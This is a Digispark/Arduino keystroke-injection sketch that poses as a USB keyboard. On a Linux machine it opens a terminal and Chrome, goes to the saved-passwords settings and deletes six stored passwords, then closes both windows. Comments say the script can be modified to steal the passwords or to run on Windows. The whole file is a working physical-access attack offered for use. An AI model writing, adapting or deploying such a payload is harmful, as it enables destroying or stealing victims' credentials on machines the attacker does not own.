// This script is to remove chrome stored passwords. This script is for linux but can be modified for Windows.
// This script can be modify to steal the stored passwords but this one is limited to removing them.
// This script is applicable for current interface of chrome


#include "DigiKeyboard.h"
#define KEY_TAB  43
#define KEY_DOWN 0x51
#define UP 0x52 

int i = 0;
void setup() {
  // don't need to set anything up to use DigiKeyboard
  
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_GUI_LEFT); //Open terminal in linux 
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("google-chrome");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  //Open Google chrome 
  DigiKeyboard.delay(4000);
  DigiKeyboard.println("chrome://settings/");//open chrome settings
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(4000); //for loading the settings
  for(i=0; i<6; i++){
    DigiKeyboard.sendKeyStroke(KEY_TAB);//Navigate to the Passwords Tab
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  for(i=0; i<9; i++){
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    }                                   //Get the first password options to remove the password
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.sendKeyStroke(UP);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.sendKeyStroke(UP);
  
  for(i=0; i<5; i++){
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(UP);
  DigiKeyboard.sendKeyStroke(UP);// My chrome works with this extra statement but not true for all systems so if your system is not working delete this statement
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Removing Passwd
  }
  //Remove 6 password present in the chrome 
  //This can be further use to steal stored passwords in the chrome 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // To close chrome browser
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);//Finally exit terminal
  for(;;);
  
}
